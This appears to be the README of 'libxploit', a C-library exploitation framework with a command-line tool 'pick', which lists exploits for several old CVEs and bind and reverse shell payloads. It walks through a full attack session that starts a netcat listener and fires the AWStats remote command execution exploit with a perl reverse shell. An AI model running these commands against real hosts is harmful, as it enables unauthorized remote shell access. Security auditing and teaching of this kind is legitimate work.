
## libxploit - exploitation framework as C API

### Introduction

Aim of this project is to design and implement exploitation framework (like Metasploit) written in C language and provided as C library.

Advantages of doing so:

 * adding bindings to other programming languages is possible 
 * exploitation functionality can be added to other programs
 * writing non-interactive programs with exploitation capability is possible
 * automation is possible  

Despite the potential practical usage of this library main purpose of creating it by it's author are educational reasons.

Together with the library, command line utility `pick` ('wytrych' in Polish) is provided. The utility exposes API's functionality for command line use:

```
Usage: ./pick [options] --exploit <exploit> --payload <payload> --exploit-opts <options> --payload-opts <options>

Options:
   -h/--help    : this help
   -v    : verbose mode
   -d    : debug mode
   --show-exploits    : show all available exploits
   --show-payloads    : show all available payloads
   --exploit-help <exploit>    : how doc for <exploit>
   --payload-help <payload>    : how doc for <payload>
   --exploit <exploit>    : use <exploit> as exploit
   --payload <payload>    : use <payload> as payload
   --exploit-opts <n1=v1,[n2=v2,...]>    : provide exploit options
   --payload-opts <n1=v1,[n2=v2,...]>    : provide payload options
```

By default `pick` comes statically compiled which makes it perfect for checking for local privileges escalation vulnerabilities when doing server security audits.

### Typical command line session

Show available exploits:

    $ ./pick --show-exploits

Choose exploit of interest from the output:

```
[ CVE-2013-1662 ] VMWare setuid vmware-mount unsafe popen(3)
Affected software: VMWare Workstation ver. <= 9.0.2 build-1031769
References:
http://blog.cmpxchg8b.com/2013/08/security-debianisms.html
http://www.vmware.com/support/support-resources/advisories/VMSA-2013-0010.html
Exploit name: vmware-mount

[ NO-CVE ] Setuid Nmap Exploit
Affected software: Nmap with suid privileges
References:
 -
Exploit name: setuid-nmap

[ CVE-2006-3392 ] AWStats configdir remote command execution
Affected software: Awstats ver. <= 6.2
References:
https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-0116
http://www.securityfocus.com/bid/12298/info
Exploit name: exec-awstats

[ CVE-2006-3392 ] Webmin/Usermin File Disclosure
Affected software: Webmin ver. < 1.290, Usermin ver. < 1.220
References:
http://secunia.com/advisories/20892/
Exploit name: fdisc-webmin
```

Show details about chosen exploit:

    $ ./pick --exploit-help exec-awstats

Output:

```
[ CVE-2006-3392 ] AWStats configdir remote command execution
Affected software: Awstats ver. <= 6.2
References:
https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-0116
http://www.securityfocus.com/bid/12298/info
Type: remote

Exploit options:

Name   Default setting      Required
----   ---------------      --------
RHOST                       yes
RPORT  80                   yes
URI    /awstats/awstats.pl  yes
VHOST                       no
```

Show available payloads:

    $ ./pick --show-payloads

Choose from the output the one that provides desired effect:

```
null - empty payload
linux-x86-exec - executes provided linux command
cmd-bind-awk - listens for a connection & spawns shell via awk
cmd-generic - executes supplied command line
cmd-bind-nc - listens for a connection & spawns shell via netcat
cmd-bind-perl - listens for a connection & spawns shell via perl
cmd-reverse-perl - creates reverse shell via perl
```

See the details of chosen payload:

    $ ./pick --payload-help cmd-reverse-perl

Payload's details:

```
cmd-reverse-perl - creates reverse shell via perl

Payload options:

Name   Default setting  Required
----   ---------------  --------
LHOST                   yes
LPORT                   yes
```

For reverse shell payloads (`*-reverse-*`) connection handler has to be created before running the exploit. On local (192.168.1.1 in this example) machine run:

    $ nc -l -p 4444

On second terminal fire up exploit of choice with your settings: 

    $ ./pick --exploit exec-awstats --payload cmd-reverse-perl --exploit-opts RHOST=192.168.1.2,RPORT=80 --payload-opts LHOST=192.168.1.1,LPORT=4444

Get back to terminal with your connection handler and (if target machine is vulnerable) enjoy interactive remote shell session.

